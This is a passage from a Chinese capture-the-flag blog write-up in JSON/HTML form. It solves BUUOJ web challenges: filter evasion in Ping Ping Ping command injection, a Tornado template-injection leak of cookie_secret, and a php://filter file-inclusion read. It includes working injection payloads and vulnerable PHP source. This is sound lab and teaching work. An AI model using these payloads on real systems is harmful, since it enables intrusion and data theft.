class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这种方法相当高级，使用了外联方法，也就是使用`符号把命令ls的输出作为cat的输入。给大佬跪下了。</p>\n<p>bash虽然被禁用了，但是还有一个sh可以使用，sh是linux中运行shell的命令，bash相当于sh的升级版，我也试了一下dash能不能使用，但是不能使用dash，这可能是系统内核版本的原因。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">ip&#x3D;127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>查看了一下系统信息，靶机是Alpine Linux系统。</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>dash是的debian上的一个shell，为了得到更快的速度debian已经把/bin/sh–&gt;dash了。我的Deepin系统也是如此。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201006105604.png\" alt=\"sh\"></p>\n<p>震惊了，居然就没有bash，所以就算他不过滤了bash也是用不了的。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">lrwxrwxrwx    1 root     root            12 Jan 30  2019 &#x2F;bin&#x2F;sh -&gt; &#x2F;bin&#x2F;busybox<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>指向了busybox，BusyBox 是一个集成了三百多个最常用Linux命令和工具的软件。BusyBox 包含了一些简单的工具，例如ls、cat和echo等等，还包含了一些更大、更复杂的工具，例grep、find、mount以及telnet。</p>\n<p>由于Alpine Linux还有一个ash的shell，所以不用sh而用ash也是可以的。</p>\n<h2 id=\"0x05-护网杯-2018-easy-tornado\"><a href=\"#0x05-护网杯-2018-easy-tornado\" class=\"headerlink\" title=\"0x05 [护网杯 2018]easy_tornado\"></a>0x05 [护网杯 2018]easy_tornado</h2><p>考点：SSTI</p>\n<p>上来给三个文件，flag.txt、welcome.txt、hints.txt，下面看一下</p>\n<p>hints.txt给出的信息是<code>md5(cookie_secret+md5(filename))</code>,同时观察到了，url处的filehash参数，应该就是来源于此算法。welcome.php里面只有<code>render</code>，flag.txt告诉我<code>flag in /fllllllllllllag</code>。</p>\n<p>如果不提交filehash是会报错的,关键在于如何得到cookie_secret这个东西，cookie里完全没有这个东西，没有眉目。注意到error界面的url处，传入了一个参数msg，看看这个点能不能利用。经过测试发现我们传入的msg会被输出，所以看看有没有可能可以ssti。</p>\n<p>试了一下49，回显了一个ORZ,这里题目说是tornado,就去百度学习一下。</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>Tornado龙卷风是一个开源的网络服务器框架，它是基于社交聚合网站FriendFeed的实时信息服务开发而来的。2007年由4名Google前软件工程师一起创办了FriendFeed，旨在使用户能够方便地跟踪好友在Facebook和Twitter等多个社交网站上的活动。结果两年后，Facebook宣布收购FriendFeed，交易价格约为5000万美元。而此时FriendFeed只有12名员工。据说这帮人后来又到了Google，搞出了现在的Google App Engine…</p></blockquote>\n<p>具体可以查看这里<a href=\"https://www.jianshu.com/p/3a928ade93dc\">https://www.jianshu.com/p/3a928ade93dc</a></p>\n<p>了解到有一个handler.settings可以读取环境变量</p>\n<pre class=\"line-numbers language-json\" data-language=\"json\"><code class=\"language-json\"><span class=\"token punctuation\">&#123;</span>'autoreload'<span class=\"token operator\">:</span> True<span class=\"token punctuation\">,</span> 'compiled_template_cache'<span class=\"token operator\">:</span> False<span class=\"token punctuation\">,</span> 'cookie_secret'<span class=\"token operator\">:</span> '5465bf2d-a931-4c50<span class=\"token number\">-9001</span>-5e848516c6be'<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>所以就可以拿到一个cookie_secret。下面就可以去构造了：</p>\n<p>filehash:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">955928fcfdde832100b612bda4304491<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://s1.ax1x.com/2020/10/06/0UkFET.png\" alt=\"flag\"></p>\n<p>关键还是在于对tornado的ssti，获取到secret_cookie。</p>\n<h2 id=\"0x06-ACTF2020-新生赛-Include\"><a href=\"#0x06-ACTF2020-新生赛-Include\" class=\"headerlink\" title=\"0x06 [ACTF2020 新生赛]Include\"></a>0x06 [ACTF2020 新生赛]Include</h2><p>考点：文件包含</p>\n<p>进去给一个跳转到?file=flag.php页面，可以发现吧flag.php通过file参数传入。考虑到考察文件包含，当然结合题目也应该猜到了。跳转到的界面说Can you find out the flag。直接php伪协议上去试一下。</p>\n<p>payload:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>得到base64回显,解码base64：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Can you find out the flag?\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//flag&#123;179d5027-72c8-41ea-b06a-7bdd3df41ad8&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>index.php:</p>\n<pre class=\"line-numbers language-php+HTML\" data-language=\"php+HTML\"><code class=\"language-php+HTML\">&lt;meta charset&#x3D;&quot;utf8&quot;&gt;\n&lt;?php\nerror_reporting(0);\n$file &#x3D; $_GET[&quot;file&quot;];\nif(stristr($file,&quot;php:&#x2F;&#x2F;input&quot;) || stristr($file,&quot;zip:&#x2F;&#x2F;&quot;) || stristr($file,&quot;phar:&#x2F;&#x2F;&quot;) || stristr($file,&quot;data:&quot;))&#123;\n    exit(&#39;hacker!&#39;);\n&#125;\nif($file)&#123;\n    include($file);\n&#125;else&#123;\n    echo &#39;&lt;a href&#x3D;&quot;?file&#x3D;flag.php&quot;&gt;tips&lt;&#x2F;a&gt;&#39;;\n&#125;\n?&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>可以看到其实有过滤，不过太巧了，我直接就php://filter了。</p>\n","text":"0x01 [极客大挑战 2019]PHP考点：PHP反序列化 上来就是一只喵，提示备份文件,试一试常见的备份格式，www.zip文件下载到本地。 解压后就这几个文件，其中index.php、flag.php、class.php才是重点，看一下都写了什么东西。 index.php：...","link":"","photos":[],"count_time":{"symbolsCount":"8.1k","symbolsTime":"7 mins."},"categories":[{"name":"CTF","slug":"CTF","count":44,"path":"api/categories/CTF.json"}],"tags":[{"name":"CTF","slug":"CTF","count":16,"path":"api/tags/CTF.json"},{"name":"BUUOJ","slug":"BUUOJ","count":13,"path":"api/tags/BUUOJ.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP\"><span class=\"toc-text\">0x01 [极客大挑战 2019]PHP</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec\"><span class=\"toc-text\">0x02 [ACTF2020 新生赛]Exec</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x03-MRCTF2020-Ezpop\"><span class=\"toc-text\">0x03 [MRCTF2020]Ezpop</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x04-GXYCTF2019-Ping-Ping-Ping\"><span class=\"toc-text\">0x04 [GXYCTF2019]Ping Ping Ping</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x05-%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado\"><span class=\"toc-text\">0x05 [护网杯 2018]easy_tornado</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x06-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include\"><span class=\"toc-text\">0x06 [ACTF2020 新生赛]Include</span></a></li></ol>","author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"西湖论剑之easyjson","uid":"b6ef90df0d5401009a96a4d7a8cf8b92","slug":"西湖论剑之easyjson","date":"2020-10-09T11:41:27.000Z","updated":"2020-10-09T11:49:32.000Z","comments":true,"path":"api/articles/西湖论剑之easyjson.json","keywords":"A1andNS","cover":[],"text":"[西湖论剑2020] EasyJson考点：代码审计 &lt;?php include 'security.php'; if(!isset($_GET['source']))&#123; show_source(__FILE__); die(); &#125; $sandbox ...","link":"","photos":[],"count_time":{"symbolsCount":"3.3k","symbolsTime":"3 mins."},"categories":[{"name":"CTF","slug":"CTF","count":44,"path":"api/categories/CTF.json"}],"tags":[{"name":"CTF","slug":"CTF","count":16,"path":"api/tags/CTF.json"},{"name":"西湖论剑","slug":"西湖论剑","count":2,"path":"api/tags/西湖论剑.json"}],"author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"BUUOJ刷题(2020-20-04)","uid":"586afb52f643078e9cf305f6eadf9480","slug":"BUUOJ刷题-2020-20-04","date":"2020-10-04T06:27:46.000Z","updated":"2021-06-28T14:57:53.000Z","comments":true,"path":"api/articles/BUUOJ刷题-2020-20-04.json","keywords":"A1andNS","cover":"https://gitee.com/A1andNS/blogimage/raw/master/img/3.png","text":"0x01 [SUCTF 2019]EasySQL这题经过测试可以知道会有三种情况，一种是回nonono，一种是回复数组，一种是没有回复。 通过nonono可以知道哪些被过滤了。例如from、flag、之类的都被过滤了，所以尝试使用堆叠注入。 可以看到有一个CTF数据库，里面有一个...","link":"","photos":[],"count_time":{"symbolsCount":"3.4k","symbolsTime":"3 mins."},"categories":[{"name":"CTF","slug":"CTF","count":44,"path":"api/categories/CTF.json"}],"tags":[{"name":"WEB","slug":"WEB","count":39,"path":"api/tags/WEB.json"},{"name":"SUCTF","slug":"SUCTF","count":2,"path":"api/tags/SUCTF.json"},{"name":"BUUOJ","slug":"BUUOJ","count":13,"path":"api/tags/BUUOJ.json"}],"author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}